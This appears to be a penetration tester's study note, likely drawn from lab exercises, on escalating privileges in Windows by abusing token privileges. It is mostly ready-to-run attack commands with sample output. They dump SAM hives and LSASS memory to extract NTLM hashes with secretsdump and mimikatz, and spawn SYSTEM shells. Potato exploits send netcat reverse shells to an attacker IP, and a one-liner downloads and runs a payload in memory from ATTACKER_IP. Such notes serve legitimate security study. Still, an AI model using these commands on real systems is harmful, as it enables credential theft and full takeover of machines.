---
id: Privileges
aliases: []
tags:
  - Microsoft/Windows/Privileges
links: "[[Windows]]"
---

# Privilege Enumeration

Enumerate [[Microsoft/Windows/General/Authorization/Privileges|Privileges]]

___

<!-- User Privileges {{{-->
## User Privileges

Current user privileges

> [!tip]
>
> Some privileges are only available when running an elevated
> `cmd` or `PowerShell` session

[whoami](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami) —
Get current user privileges

```sh
whoami /priv
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\htb> whoami /priv
> ```
>
> ```sh
> PRIVILEGES INFORMATION
> ----------------------
>
> Privilege Name                Description                    State
> ============================= ============================== ========
> SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
> SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
> ```
<!-- }}} -->

[Get-LocalUser](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser?view=powershell-5.1) —
Get local user accounts and display all properties

```powershell
Get-LocalUser | Select-Object *
```
___
<!-- }}} -->

<!-- Windows Token Privileges {{{-->
# Windows Token Privileges

In Windows, every [[Processes/Processes|process]] has a copy of an
[[Access Tokens]] that has information about the account
that is running it

> [!warning]
>
> These tokens are not considered secure resources,
> as they are just locations within memory
> that could be brute-forced by users that cannot read memory

<!-- Resources {{{-->
> [!info] Resources
>
> - [HackTricks - Abusing Tokens](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html)
<!-- }}} -->

___

<!-- SeAssignPrimaryTokenPrivilege {{{-->
## SeAssignPrimaryTokenPrivilege

`SeAssignPrimaryTokenPrivilege` allows to assign a primary token
to a new/suspended process

> [!todo]

<!-- Tools {{{-->
> [!tip]- Tools
>
> Abuse `SeAssignPrimaryTokenPrivilege` to escalate privileges
>
> - [Juicypotato](https://github.com/ohpe/juicy-potato)
<!-- }}} -->

___
<!-- }}} -->

<!-- SeBackupPrivilege {{{-->
## SeBackupPrivilege

[SeBackupPrivilege](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges)
allows to

- Read access to any file
- Read the password hashes of local Administrator

**READ FILE CONTENT**

[SeBackupPrivilege](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges)
allows to traverse any folder and list the folder contents

1. Import [SeBackupPrivilege POC](https://github.com/giuliano108/SeBackupPrivilege)
   libraries

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
```

```powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Enable and verify privilege

```powershell
Set-SeBackupPrivilege
```

```powershell
Get-SeBackupPrivilege
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> Set-SeBackupPrivilege
> ```
>
> ```powershell
> PS C:\htb> Get-SeBackupPrivilege
> ```
>
> ```sh
> SeBackupPrivilege is enabled
> ```
<!-- }}} -->

4. Copy a protected file

```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

<!-- Example {{{-->
> [!example]-
>
> 1. Try accessing the file
>
> ```powershell
> PS C:\htb> cat 'C:\Confidential\2021 Contract.txt'
> ```
>
> ```powershell
> cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
> At line:1 char:1
> + cat 'C:\Confidential\2021 Contract.txt'
> + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>     + CategoryInfo          : PermissionDenied: (C:\Confidential\2021 Contract.txt:String) [Get-Content], Unauthor
>    izedAccessException
>     + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
> ```
>
> 2. Copy the file with `Copy-FileSeBackupPrivilege`
>
> ```powershell
> PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
> ```
> ```powershell
> Copied 88 bytes
> ```
>
> 3. Open file
>
> ```powershell
> PS C:\htb>  cat .\Contract.txt
> ```
> ```powershell
> Inlanefreight 2021 Contract
>
> ==============================
>
> Board of Directors:
>
> <...SNIP...>
> ```
<!-- }}} -->

**EXPORT REGISTRY HIVES**

[SeBackupPrivilege](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges)
allows access to  [[Registry]] hives

1. Export `SYSTEM` and `SAM` registry hives

```sh
reg save hklm\sam sam
```

```sh
reg save hklm\system system
```

2. [[Impacket]] - [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) —
Extract hashes on the attacker machine

```sh
impacket-secretsdump -sam sam -system system local
```

<!-- Info {{{-->
> [!info]-
>
> - `-sam`: Path to the `SAM` file, containing encrypted password data
> - `-system`: Path to the `SYSTEM` file, containing the boot key
>   required to decrypt the SAM file
> - `local`: Local file that is not being accessed remotely
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> impacket-secretsdump -sam sam -system system local
> ```
> ```sh
> Impacket v0.12.0.dev1 - Copyright 2023 Fortra
> [*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
> [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f3
> 41:::
> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08
> 9c0:::
> [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't
> have hash information.
> [*] Cleaning up...
> ```
> The `Administrator`'s [[NTLM]] hash is `2b87e7c93a3e8a0ea4a581937016f341`
<!-- }}} -->

<!-- Tip {{{-->
> [!tip]
>
> The exported hashes can be used in Pass-the-Hash attacks
> - [[WinRM/Exploitation#Pass-the-Hash|WinRM]]
<!-- }}} -->

___
<!-- }}} -->

<!-- SeDebugPrivilege {{{-->
## SeDebugPrivilege

`SeDebugPrivilege` privilege allows to debug other processes,
including to read and write their memory

**DUMP MEMORY**

1. Dump process memory (*e.g., [[Processes/Processes#LSASS|LSASS]]*)

[ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) —
Dump process memory

```sh
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp
> ```
>
> ```sh
> ProcDump v10.0 - Sysinternals process dump utility
> Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
> Sysinternals - www.sysinternals.com
>
> [15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
> [15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
> [15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
> [15:25:46] Dump count reached.
> ```
<!-- }}} -->

[Task Manager](https://en.wikipedia.org/wiki/Task_Manager_(Windows)) —
Dump process memory manually

> [!example]-
>
> ![[privileges-sedebugprivilege-taskmgr.png]]

2. [[Mimikatz]] — Extract the local administrator account's [[NTLM]] hash

```sh
mimikatz.exe
```

```sh
log
```

```sh
sekurlsa::minidump lsass.dmp
```

```sh
sekurlsa::logonpasswords
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\htb> mimikatz.exe
> ```
> ```cmd
>   .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
>  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
>  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
>  ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
>  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
>   '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
>
> mimikatz # log
> Using 'mimikatz.log' for logfile : OK
>
> mimikatz # sekurlsa::minidump lsass.dmp
> Switch to MINIDUMP : 'lsass.dmp'
>
> mimikatz # sekurlsa::logonpasswords
> Opening : 'lsass.dmp' file for minidump...
>
> Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
> Session           : Interactive from 4
> User Name         : DWM-4
> Domain            : Window Manager
> Logon Server      : (null)
> Logon Time        : 3/31/2021 3:00:57 PM
> SID               : S-1-5-90-0-4
>         msv :
>         tspkg :
>         wdigest :
>          * Username : WINLPE-SRV01$
>          * Domain   : WORKGROUP
>          * Password : (null)
>         kerberos :
>         ssp :
>         credman :
>
> <SNIP>
>
> Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
> Session           : RemoteInteractive from 2
> User Name         : jordan
> Domain            : WINLPE-SRV01
> Logon Server      : WINLPE-SRV01
> Logon Time        : 3/31/2021 2:59:52 PM
> SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
>         msv :
>          [00000003] Primary
>          * Username : jordan
>          * Domain   : WINLPE-SRV01
>          * NTLM     : cf3a5525ee9414229e66279623ed5c58
>          * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
>         tspkg :
>         wdigest :
>          * Username : jordan
>          * Domain   : WINLPE-SRV01
>          * Password : (null)
>         kerberos :
>          * Username : jordan
>          * Domain   : WINLPE-SRV01
>          * Password : (null)
>         ssp :
>         credman :
>
> <SNIP>
> ```
<!-- }}} -->

**REMOTE CODE EXECUTION (RCE)**

1. [tasklist](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist) —
[[Processes#Identify|Identify]] processes running as `SYSTEM`

```sh
tasklist
```
```sh
tasklist /v /fi "username eq system"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> PS C:\htb> tasklist
> ```
>
> ```sh
> Image Name                     PID Session Name        Session#    Mem Usage
> ========================= ======== ================ =========== ============
> System Idle Process              0 Services                   0          4 K
> System                           4 Services                   0        116 K
> smss.exe                       340 Services                   0      1,212 K
> csrss.exe                      444 Services                   0      4,696 K
> wininit.exe                    548 Services                   0      5,240 K
> csrss.exe                      556 Console                    1      5,972 K
> winlogon.exe                   612 Console                    1     10,408 K
> ```
>
> - `winlogon.exe` is running as `SYSTEM` under PID `612`
<!-- }}} -->

2. [psgetsystem](https://github.com/decoder-it/psgetsystem)
Exploit the process running as `SYSTEM`

```powershell
.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

> [!example]-
>
> ```powershell
> import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(612,"c:\windows\System32\cmd.exe")
> ```

```powershell
.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent((Get-Process "<process_name>").Id,<command_to_execute>,"")
```

> [!example]-
>
> ```powershell
> import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent((Get-Process "lsass").Id,"c:\windows\System32\cmd.exe","")
> ```

> [!todo]
>
> The command may have changed after latest update

```powershell
.\psgetsys.ps1
```

```powershell
ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
```

> [!todo]
>
> [GitHub - SeDebugPrivilegePOC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)

___
<!-- }}} -->

<!-- SeImpersonatePrivilege {{{-->
## SeImpersonatePrivilege

Windows letting a process impersonate the security token of another user

A privileged token can be acquired from a Windows service (DCOM)
by inducing it to perform [[NTLM]] authentication against an exploit,
subsequently enabling the execution of a process with `SYSTEM` privileges

1. **TARGET**: [[MSSQL/Exploitation#User|Enumerate User Privileges]]
   for enabled `SeImpersonatePrivilege`

2. **TARGET**: [[File Transfer/Windows/Download|Download]]
   the exploit and [[Netcat]] to the target

3. **ATTACKER**: Listen with [[Netcat]] on port `8443`

[GodPotato](https://github.com/BeichenDream/GodPotato)

```sh
C:\GodPotato.exe -cmd "nc -t -e C:\cmd.exe <attacker_ip> 8443"
```

[RoguePotato](https://github.com/antonioCoco/RoguePotato)

```sh
C:\RoguePotato.exe -r <attacker_ip> -c "C:\ncat.exe <attacker_ip> 8443 -e cmd" -l 9999
```

```sh
C:\RoguePotato.exe -r <attacker_ip> -c "C:\ncat.exe <attacker_ip> 8443 -e cmd" -f 9999
```

[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

```sh
C:\PrintSpoofer.exe -c "C:\ncat.exe <attacker_ip> 8443 -e cmd"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
> ```
>
> ```sh
> output
>
> --------------------------------------------------------------------------------
>
> [+] Found privilege: SeImpersonatePrivilege
>
> [+] Named pipe listening...
>
> [+] CreateProcessAsUser() OK
>
> NULL
> ```
<!-- }}} -->

[SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
(*[GodPotato](https://github.com/BeichenDream/GodPotato) fork*)

Load and execute from memory (*no disk touch*)

```sh
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
```

```sh
[SigmaPotato]::Main("cmd /c whoami")
```

Spawn a [[PowerShell]] [reverse shell](https://www.revshells.com/)

```sh
[SigmaPotato]::Main(@("--revshell","<attacker_ip>","8443"))
```

[SweetPotato](https://github.com/CCob/SweetPotato)

```sh

```

[Juicy Potato](https://github.com/ohpe/juicy-potato)

> [!warning]
>
> Works before
> - Windows 10 build 1809
> - Windows Server 2019

```sh
c:\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <attacker_ip> 8443 -e cmd.exe" -t *
```

<!-- Info {{{-->
> [!info]-
>
> - `-l`: COM server listening port
> - `-p`: Program to launch
> - `-a`: Argument passed to `cmd.exe`
> - `-t`: [createprocess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
>    call
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
>
> ```sh
> SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
> ```
>
> ```sh
> output
>
> -----------------------------------------------------------------------------
>
> Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375
>
> [+] authresult 0
> {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
> [+] CreateProcessWithTokenW OK
> [+] calling 0x000000000088ce08
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- SeTakeOwnerShipPrivilege {{{-->
## SeTakeOwnerShipPrivilege

[SeTakeOwnershipPrivilege](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)
grants a user the ability to take ownership of any "securable object"
(*e.g., Active Directory objects, NTFS files/folders, printers,
registry keys, services, and processes*)

1. Choose a target file

2. Enumerate target file ownership

```powershell
Get-ChildItem -Path 'C:\Share\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

<!-- Example {{{-->
> [!example]-
>
> The owner of `cred.txt` is not shown due to lack of permissions to read
>
> ```powershell
> PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
> ```
> ```powershell
>
> FullName                                 LastWriteTime         Attributes Owner
> --------                                 -------------         ---------- -----
> C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
> ```
>
> ```sh
> cmd /c dir /q 'C:\Share'
> ```
<!-- }}} -->

```powershell
cmd /c dir /q 'C:\Share\'
```

<!-- Example {{{-->
> [!example]-
>
> The containing directory is owned by `sccm_svc`
>
> ```powershell
> PS C:\htb> cmd /c dir /q 'C:\Department Share\Private\IT'
> ```
> ```powershell
>  Volume in drive C has no label.
>  Volume Serial Number is 0C92-675B
>
>  Directory of C:\Department Share\Private\IT
>
> 06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
> 06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
> 06/18/2021  12:23 PM                36 ...                    cred.txt
>                1 File(s)             36 bytes
>                2 Dir(s)  17,079,754,752 bytes free
> ```
<!-- }}} -->

3. Take file ownership

[takeown](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) —
Enables an administrator to take ownership of the file

```powershell
takeown /f 'C:\Share\cred.txt'
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
> ```
> ```powershell
> SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
> ```
<!-- }}} -->

4. Confirm modified ownership

```powershell
Get-ChildItem -Path 'C:\Share\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
> ```
>
> ```powershell
> Name     Directory                       Owner
> ----     ---------                       -----
> cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
> ```
<!-- }}} -->

5. Modify file ACL

```powershell
icacls 'C:\Share\cred.txt' /grant <user>:F
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
> ```
>
> ```powershell
> processed file: C:\Department Shares\Private\IT\cred.txt
> Successfully processed 1 files; Failed processing 0 files
> ```
<!-- }}} -->

6. Read the file

```powershell
cat 'C:\Share\cred.txt'
```

> [!warning]
>
> Ensure permissions/ownership is reverted

___
<!-- }}} -->

<!-- }}} -->
